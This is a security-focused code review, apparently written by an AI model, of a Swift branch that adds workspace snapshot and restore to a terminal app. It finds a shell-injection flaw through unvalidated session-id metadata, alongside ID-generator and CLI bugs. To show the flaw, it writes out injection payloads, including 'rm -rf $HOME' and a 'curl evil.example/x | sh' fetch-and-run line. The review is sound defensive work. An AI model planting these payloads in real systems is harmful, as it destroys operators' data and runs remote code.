## Critical Code Review
- **Date:** 2026-04-24T19:00:00Z
- **Model:** Claude Opus 4.7 (claude-opus-4-7)
- **Branch:** cmux-37/phase-1-snapshots-restore
- **Latest Commit (in scope):** 2047daff CMUX-37 Phase 1: acceptance fixture + skill docs
- **In-scope range:** `43807212^..2047daff` (7 commits, ~1460 LOC added)
- **Linear/Lattice Story:** CMUX-37 (Phase 1 — Workspace persistence: snapshot + restore + Claude resume)
- **Review Type:** Critical / Adversarial
- **Tests:** SKIPPED per c11 CLAUDE.md ("never run tests locally"). Test design and coverage evaluated from source.

---

## The Ugly Truth

The architecture is sound and the seam discipline is unusually good for a Phase 1 — the converter is genuinely Foundation-only, the registry is a clean closure-table, the executor change is gated by `restartRegistry: nil` so Phase 0 stays bit-exact, and the off-main / main-actor split in the v2 handlers respects CLAUDE.md's threading policy. The Phase 0 acceptance behavior is preserved by inspection. This is a competent piece of work and most of the 17 focus areas are passing.

**But there is a shell-injection vector you can drive a truck through.** The Phase 1 restart registry takes a string from surface metadata (`claude.session_id`), interpolates it into `"cc --resume \(id)"`, and hands the result to `TerminalPanel.sendText` — which writes the bytes verbatim into the terminal. The store does not validate `claude.session_id` (it is not in `SurfaceMetadataStore.reservedKeys`), the registry does not validate or escape it, and the executor does not validate or escape it. Any actor that can write surface metadata — the operator, any agent calling `surface.set_metadata`, a shell-out from a partly-trusted plugin — can plant `claude.session_id="; rm -rf $HOME"` (or worse: a payload with embedded `\n`) and the next `C11_SESSION_RESUME=1 c11 restore <id>` will execute it inside whatever shell that terminal opens with. This is the sort of thing that ships, sits dormant, and gets quietly weaponised six months later when a user installs a third-party agent that "just writes a few metadata keys."

The other real defect is in the ULID generator: the comment claims 80 random bits but the implementation only feeds 64 into the accumulator and then shifts more out than is present, so every generated snapshot id has a deterministic 3-character `'0'` prefix on the random portion (positions 10–12 of the 26-char id) and is missing 16 bits of entropy. Practically, collision risk is still negligible at any realistic snapshot count, but the IDs are visibly degenerate and the test (`testSnapshotIDGenerateProducesCrockfordBase32Stem`) only checks length and alphabet, so the bug shipped untested.

Almost everything else is at the "smell" or "doc-update" level. The shell-injection is a real Blocker.

---

## What Will Break

1. **Malicious or accidental session id → arbitrary shell execution on restore.** Path: any caller invokes `surface.set_metadata` (or `c11 surface set-metadata`) with `key=claude.session_id, value="evil; touch /tmp/pwned"`. Operator runs `C11_SESSION_RESUME=1 c11 restore <id>`. Executor synthesises `cc --resume evil; touch /tmp/pwned` and `sendText` writes that string into the terminal. Because terminal text is line-buffered for the user, even *without* an explicit `\n`, the bytes sit at the prompt — but a payload like `\nrm -rf ~\n` immediately executes when the surface attaches. No validation, no escaping, no quoting anywhere on the path. Files: `Sources/AgentRestartRegistry.swift:69-74`; `Sources/WorkspaceLayoutExecutor.swift:202-227`; `Sources/SurfaceMetadataStore.swift:143-152` (the reserved-keys set that *omits* `claude.*`).

2. **Snapshot ids have a deterministic zero prefix on the random portion and 16 fewer bits of entropy than the comment claims.** `Sources/WorkspaceSnapshot.swift:140-153`. `acc: UInt64 = (high << 16) | lowTop16` is only 64 bits but the loop extracts `16 * 5 = 80` bits via `acc >>= 5`. After 12 iterations (60 bits consumed) `acc` has 4 meaningful bits left; the remaining 4 base32 characters at positions `randChars[3..0]` (i.e. `out[10..13]`) draw from the zero-shifted high bits. Result: every id looks like `<10-char time>00 0X <12 real-random>`. Not a crash; visibly broken; collision-resistance below the documented 80 bits.

3. **`c11 restore` always creates a new workspace; it never restores into an existing one.** `Sources/TerminalController.swift:4582-4596` calls `WorkspaceLayoutExecutor.apply` which always calls `dependencies.tabManager.addWorkspace(...)`. The CLI help text says "Restore a workspace layout from a snapshot written by `c11 snapshot`" — does not say "creates an additional workspace". Operator who runs `c11 restore` twice gets two duplicate workspaces with no warning. The Phase 1 plan mentions an `applyToExistingWorkspace(_:_:_:)` method (`WorkspaceLayoutExecutor.swift:36-39` doc comment) but it is not present in this commit and `restore` does not call it. Either the docstring is stale or the implementation is incomplete.

4. **Path detection in `runSnapshotRestore` is fragile and case-sensitive.** `CLI/c11.swift:2769`: `if target.hasPrefix("/") || target.contains(".json") || target.hasPrefix("~")`. `target.contains(".json")` is case-sensitive — a path ending in `.JSON` (macOS HFS+ default is case-insensitive) is misclassified as a snapshot id and a `notFound` error is surfaced. A snapshot id containing `.json` as substring is impossible (Crockford base32 alphabet) but the case-sensitivity is a real footgun for any operator on case-sensitive APFS who saves with uppercase extension.

5. **`c11 snapshot --workspace workspace:0` is rejected.** `parseUUIDFromRef` (`CLI/c11.swift:2862-2870`) only handles bare UUIDs and `kind:UUID` form; index-style refs like `workspace:0` (which the CLI accepts elsewhere as "first workspace") fail with "is not a workspace ref or UUID". Inconsistency with the rest of c11's CLI conventions; trips up anyone scripting against snapshot.

6. **`snapshot.list` decodes the entire embedded plan for every entry just to extract title + surface count.** `Sources/WorkspaceSnapshotStore.swift:182-215`. With 100+ snapshots this is wasteful; with a malformed plan in any file the entire entry is silently dropped (`guard let snapshot = try? read(from: url) else { continue }`). Operators get no signal that an old or partially-corrupted snapshot is unreadable — it just vanishes from the list. Add either a lazy index (separate `.idx` files) or surface the decode failures as a warning row (e.g. with `source: .unreadable`).

7. **`v2SnapshotRestore` validates the plan off-main, then applies on main, with a window for state drift.** `Sources/TerminalController.swift:4549-4596`. If a workspace is renamed/closed between validation and apply, the apply runs against a different snapshot of TabManager state than was validated. Low-frequency event in single-operator mode but worth documenting.

8. **Acceptance fixture works only in DEBUG builds; will fail loudly in Release.** `c11Tests/WorkspaceSnapshotRoundTripAcceptanceTests.swift:295-301` reads `pendingInitialInputForTests` which is `#if DEBUG`. In Release the helper returns `nil → ""`, the `XCTAssertTrue(sent.contains("cc --resume \(sessionId)"))` then asserts `"".contains("cc --resume X")` and *fails* — it does not skip. CI presumably runs DEBUG xctest schemes (which is the standard), so this is fine in practice, but if anyone ever ports the suite to a Release-mode CI run the failure mode is opaque ("expected to receive cc --resume; got: ''") rather than a clean skip.

9. **`ApplyOptions.==` returns `false` for two non-nil registries even when they're literally the same value.** `Sources/WorkspaceApplyPlan.swift:233-248`. The doc says "only Codable round-trip tests rely on this" but if any future caller compares options with non-nil registries (a reasonable thing to do) they always read as inequal. Suggest adding a comment-pinned override for `.phase1 == .phase1` or making the registry identity-comparable.

10. **`claude.session_id` is plaintext-on-disk in `~/.c11-snapshots/` and `~/.cmux-snapshots/`.** Operators who commit dotfiles or share home-dir backups leak active session ids. Probably acceptable but not flagged in the docs.

---

## What's Missing

- **Tests for the shell-injection / metadata-injection surface.** `AgentRestartRegistryTests` exercises happy paths and missing-id paths but not malicious payloads. Add at minimum: `testRegistryRejectsSessionIdWithShellMetacharacters`, `testRegistryRejectsSessionIdWithNewline`, `testRegistryRejectsSessionIdExceedingPlausibleUuidLength`. The bar should be: the registry only emits a command for an id that matches a UUID-shaped (or other narrow) regex.
- **Test for re-importing a snapshot whose first surface is browser or markdown** (kind mismatch with seed terminal). The mixed-claude-mailbox fixture starts with a terminal so the seed-replace path is never exercised end-to-end. The `mixed-surfaces.json` fixture exists but only the converter test reads it; no executor acceptance run.
- **Test that `c11 restore` does NOT create duplicate workspaces** (or, alternatively, a doc + test asserting that it does and that's intentional). Right now the behavior is implicit.
- **Test for ULID generator uniformity.** `testSnapshotIDGenerateProducesCrockfordBase32Stem` only checks length+alphabet. Add `testSnapshotIDGenerateUsesAllRandomBits` that runs the generator across many distinct random outputs and asserts the random-portion characters are not biased toward `'0'`.
- **No test exercises `snapshot.list` against a malformed snapshot file** — well, `testStoreListSkipsMalformedJSON` does, but it confirms silent drop. There's no test asserting operators get *some* signal about unreadable files.
- **No round-trip test for the Phase 1 hook → store path under the advisory failure modes.** The hook logic at `CLI/c11.swift:12620-12660` has three breadcrumbs (`ok / skipped / failed`) but no test fires `surface.set_metadata` with the socket missing/orphaned/wrong-owner to verify the hook keeps its existing happy path. The advisory list (`isAdvisoryHookConnectivityError` at `CLI/c11.swift:23-31`) catches "Socket not found" / "Connection refused" / "No such file or directory" / "c11 app did not start in time" / "Failed to connect" — but **does not** catch the orphan-socket cases ("Path exists but is not a Unix socket", "Socket … is not owned by the current user"). These fall through to the bare `catch` and breadcrumb `failed`. Acceptable since the hook still returns success, but worth either adding to the advisory list or documenting why those cases warrant a `failed` rather than `skipped` breadcrumb.
- **`WorkspaceMetadataKeys.SurfaceMetadataKeyName.claudeSessionId` is declared in the app target only; the CLI hook hard-codes the literal `"claude.session_id"`.** The commit message and the source comment both say "kept in lockstep by reader convention" — i.e. nothing enforces it. If someone bumps the constant the hook silently misbehaves. A trivial test in the app target that asserts both spellings match (importable into the CLI build via a generated snippet, or codified as a `//swiftformat:` comment-attached check) would close the loop. Not a blocker, but called out as a "deviation flagged by Impl" in the focus areas; the deviation is real and the mitigation is "convention", which is the weakest possible mitigation.

---

## The Nits

- `Sources/WorkspaceSnapshot.swift:140-153` — comment says "80-bit random → 16 base32 chars. Two 64-bit calls give us 128 bits; we only need 80. Shift out of a 128-bit accumulator." The accumulator is **not** 128 bits; it's a single `UInt64`. The fix is either widen the accumulator (split into `accHigh: UInt64` and `accLow: UInt64`, draw 5 bits across both) or stop claiming 80 bits.
- `Sources/WorkspaceLayoutExecutor.swift:213` — `sessionId?.prefix(8).description ?? "nil"` for log lines is fine, but `description` on `Substring.SubSequence.Prefix` produces `Optional("Substring(...)")`-flavored strings depending on Swift version; prefer `String(sessionId?.prefix(8) ?? "")`.
- `Sources/WorkspaceSnapshotStore.swift:103` — `JSONEncoder().outputFormatting = [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]` is good for diffs; but the `.iso8601` strategy for dates loses sub-second precision (no fractional seconds) when the `Date` already came from `Date()` which has nanosecond precision. The envelope round-trip tests pass because both sides truncate; in practice a `created_at` from `Date()` then re-encoded loses precision. Document that the wire is second-precision, or set a custom formatter.
- `CLI/c11.swift:2782-2787` — env-var truthiness: accepts `"true"`, `"yes"`, `"1"`, etc. Reasonable. But `"on"` and `"enabled"` are also commonly used; consider matching `isTruthyFlag` to the bash convention used elsewhere in the file or document the exact set.
- `Sources/AgentRestartRegistry.swift:59-64` — `named(_:)`'s "unknown name → nil → silent fallback to Phase 0 behavior" is a deliberate choice but means a typo in a wire payload (`"phase01"`) is undetectable by the operator. At minimum log a warning; ideally return an error so the CLI can print "unknown restart_registry name 'phase01'".
- `Sources/WorkspaceSnapshotCapture.swift:139-167` — pane metadata is attached to the *first* surface in the pane. This is correct and round-trips correctly but is non-obvious; a brief comment on the round-trip property at the executor write site would help. (Currently only commented at capture site.)
- `Sources/TerminalController.swift:4474` — `URL(fileURLWithPath: trimmed)` does not expand `~`; if the operator sends `params["path"] = "~/snapshots/foo.json"` over the socket the file is created at a literal `./~/snapshots/foo.json` directory off cwd. The CLI expands `~` itself (`resolvePath`) before sending, but other socket clients won't. Either expand at the handler too or document the contract.
- The `LiveWorkspaceSnapshotSource` walker reads `panel.requestedWorkingDirectory` for terminals (`WorkspaceSnapshotCapture.swift:196-200`) but the field can be empty/nil for terminals that inherited cwd at launch. On restore those terminals get whatever the workspace cwd is — usually correct, but the test fixtures don't cover the "terminal launched with explicit cwd, restored" round trip.
- `c11Tests/WorkspaceSnapshotConverterTests.swift:185-204` — the helper `XCTSkipResult` is a misleading name: it's an `Error`, not a skip; nothing actually skips. Rename to `ConverterTestError` or use `XCTSkip(...)` properly.

---

## Numbered List

### Blockers (will cause production incidents or data loss)

1. **B1 — Shell injection via `claude.session_id` surface metadata.** `cc --resume \(id)` interpolation with no validation/escaping/quoting. Anyone who can write surface metadata can plant arbitrary shell payloads that fire on the next `C11_SESSION_RESUME=1 c11 restore`. Files: `Sources/AgentRestartRegistry.swift:69-74`, `Sources/WorkspaceLayoutExecutor.swift:202-227`. Fix: validate `claude.session_id` against a strict UUID-or-similar regex at write time (`SurfaceMetadataStore.reservedKeys` + a new validator) AND add a defensive validator in the registry resolver itself. Belt-and-braces — this is the kind of payload that re-emerges through a future code path if only one of the two is fixed. Tests: add explicit malicious-payload cases to `AgentRestartRegistryTests`. ✅ Confirmed by inspection of the registry, executor, store, and `sendText` chain.

### Important (will cause bugs or poor UX)

2. **I1 — ULID random portion has 16 fewer bits of entropy than documented and a deterministic 3-char `'0'` prefix.** `Sources/WorkspaceSnapshot.swift:140-153`. Visible in every generated id. Fix: either widen accumulator or document as 64-bit random and adjust the loop to 12 iterations (`12 * 5 = 60` bits) with the remaining 4 chars filled from a separate UInt64. ✅ Confirmed by tracing the loop arithmetic.

3. **I2 — `c11 restore` always creates a new workspace, never restores in-place; not documented.** `Sources/TerminalController.swift:4582-4596`. Operator surprise; running `restore` twice produces two duplicate workspaces. Fix: either implement `applyToExistingWorkspace` (the doc comment in `WorkspaceLayoutExecutor.swift:37-39` references it but it doesn't exist) and add a `--in-place` flag, OR update the CLI help text + Phase 1 docs to make the new-workspace behavior explicit. ✅ Confirmed by reading the executor and the v2 handler.

4. **I3 — `runSnapshotRestore` path detection is case-sensitive on `.json`.** `CLI/c11.swift:2769`. Operators on APFS with uppercase extensions get cryptic "snapshot id not found" errors. Fix: lowercase comparison or check `URL(fileURLWithPath: ...).pathExtension.lowercased() == "json"`. ❓ Likely real; test on case-sensitive filesystem to confirm impact.

5. **I4 — `snapshot.list` silently drops malformed snapshot files.** `Sources/WorkspaceSnapshotStore.swift:202-203`. Operator can't tell why an old snapshot disappeared. Fix: emit an `unreadable` row in the index with the parse error. ✅ Confirmed by reading the enumerator + the test that asserts silent skip.

6. **I5 — `claudeSessionId` constant lives only in the app target; CLI hook uses the literal `"claude.session_id"`.** Drift risk. Files: `Sources/WorkspaceMetadataKeys.swift:29`, `CLI/c11.swift:12640`. Fix: extract a Foundation-only `WorkspaceMetadataKeys` module shared between the app and CLI targets, or generate the literal at build time. ✅ Confirmed by grep of both targets.

### Potential (code smells, missing tests, things that will bite later)

7. **P1 — `snapshot.list` decodes the full plan per file just to extract title and surface count.** Wasteful at scale. `Sources/WorkspaceSnapshotStore.swift:186-215`.

8. **P2 — `AgentRestartRegistry.named(_:)` silently falls back to Phase 0 on unknown wire names.** `Sources/AgentRestartRegistry.swift:59-64`. Typo in `restart_registry` is undetectable. Fix: return an error or log a warning.

9. **P3 — `ApplyOptions.==` returns false for two non-nil-but-identical registries.** `Sources/WorkspaceApplyPlan.swift:233-248`. Surprising; restrict via doc-pinned constants or make registries identity-comparable.

10. **P4 — Acceptance test suite is DEBUG-only.** `c11Tests/WorkspaceSnapshotRoundTripAcceptanceTests.swift:295-301`. Will fail (not skip) in Release. Acceptable for current CI but document the gating.

11. **P5 — Plaintext `claude.session_id` on disk in `~/.c11-snapshots/`.** Documented nowhere. Add a one-line note in `skills/c11/references/claude-resume.md`.

12. **P6 — `c11 snapshot --workspace workspace:0` rejects index-form refs.** `CLI/c11.swift:2862-2870`. Inconsistent with rest of CLI. Fix: route through the same workspace-resolver as the other commands.

13. **P7 — Orphan-socket / wrong-owner errors not in `isAdvisoryHookConnectivityError` advisory set.** `CLI/c11.swift:23-31`. The hook still completes (bare `catch` absorbs them) but breadcrumb is `failed` not `skipped`. Decide which signal you want and either add to the advisory list or document.

14. **P8 — No test exercises a snapshot whose first surface is browser/markdown** (seed-replace path). The `mixed-surfaces.json` fixture exists but only the converter test reads it; no executor end-to-end run.

15. **P9 — `LiveWorkspaceSnapshotSource.defaultVersionString` reads `Bundle.main.infoDictionary` at every snapshot.** Cheap but cacheable; not a blocker, just a smell.

16. **P10 — Walker is `O(panes²)` from `allPaneIds.first { ... }`.** Documented at `WorkspaceSnapshotCapture.swift:27-29`; pane counts are small so OK. Worth a benchmark gate if pane counts ever grow.

---

## Phase 5: Validation Pass

| ID | Status | Notes |
|----|--------|-------|
| B1 | ✅ Confirmed | Read `AgentRestartRegistry.swift:69-74`, `WorkspaceLayoutExecutor.swift:202-227`, `SurfaceMetadataStore.swift:143-152`, `Panels/TerminalPanel.swift:208-210`, `GhosttyTerminalView.swift:3534-3541`. The chain is: any `surface.set_metadata` write of `claude.session_id` (no validation since key is not in `reservedKeys`) → `stringMetadata` flatten → `registry.resolveCommand` returns `"cc --resume \(id)"` → `terminalPanel.sendText(cmd)` → `surface.sendText(text)` → `writeTextData(...)`. No quoting, escaping, or validation anywhere on the path. To exploit: `c11 surface set-metadata --key claude.session_id --value "fake; curl evil.example/x | sh"` then `C11_SESSION_RESUME=1 c11 restore <id>`. The pre-ready text queue means the payload is delivered as soon as the Ghostty surface comes up. |
| I1 | ✅ Confirmed | Traced the loop arithmetic. `acc` is `UInt64` (64 bits). Loop iterates 16 times reading 5 bits each in reverse order. Last 4 iterations (filling positions 0–3 of `randChars`, i.e. `out[10..13]`) draw from zero-shifted high bits. |
| I2 | ✅ Confirmed | `v2SnapshotRestore` calls `WorkspaceLayoutExecutor.apply` which always calls `tabManager.addWorkspace`. Doc comment at `WorkspaceLayoutExecutor.swift:37-39` references `applyToExistingWorkspace(_:_:_:)` which does not exist anywhere in the diff. Either the doc is stale or the implementation is incomplete. |
| I3 | ❓ Likely | `target.contains(".json")` is case-sensitive in Swift. Whether the operator hits this depends on filesystem case-sensitivity and naming conventions; on stock APFS the FS is case-insensitive but the `String.contains` check is not, so a path of `~/snap.JSON` is misclassified as a snapshot id. |
| I4 | ✅ Confirmed | `Sources/WorkspaceSnapshotStore.swift:202-203` uses `try? read(from: url)` and `continue`s on failure. The test `testStoreListSkipsMalformedJSON` confirms this is intentional. The operator-visibility concern is a design opinion, not a code defect, but the silent-drop *is* present. |
| I5 | ✅ Confirmed | `WorkspaceMetadataKeys.swift:29` defines the constant in the app target. Hook at `CLI/c11.swift:12640` hard-codes `"claude.session_id"`. The commit message at `097f79ca` explicitly notes the lockstep-by-convention. Drift is undetected by any test. |

No findings struck through. No findings demoted.

---

## Closing

**Is this code ready for production?** No, not as-is. The shell-injection vector (B1) is a single-line risk — a value-injected payload runs arbitrary shell as the operator on the next restore. Even if you trust every current caller of `surface.set_metadata`, the contract a future agent relies on says "metadata is data, not code." This change quietly violates that.

**Would I mass-deploy this to 100k users?** Absolutely not without B1 fixed. The blast radius is the operator's home directory plus whatever credentials live in their shell. The discoverability is high — it's two lines of repro. The fix is small (validate the session id against a UUID-shaped regex at the registry boundary, and pin the surface-metadata key to that grammar in `SurfaceMetadataStore.reservedKeys`).

**What needs to change before ship:**
1. **B1 (blocker):** Fix the shell-injection. Validate `claude.session_id` at write time (add to `SurfaceMetadataStore.reservedKeys` with a UUID-shaped grammar), and defensively re-validate inside the registry resolver. Add adversarial tests.
2. **I1–I3 (important):** Fix the ULID generator (or downgrade the comment). Decide whether `c11 restore` creates-new or restores-in-place and either implement or doc. Make path detection case-insensitive.
3. **I5 (important):** Either share the `claude.session_id` constant across both targets or add a build-time invariant.

The remaining Important and Potential items are real but not landing-blockers; they should land in a follow-up before Phase 2 builds on this seam. The Phase 0 bit-exact preservation is solid, the converter is properly Linux-portable, the registry shape is genuinely a one-line append for Phase 5, and the executor seam additions are defensible. Most of this is good. Fix the injection.

— Claude Opus 4.7
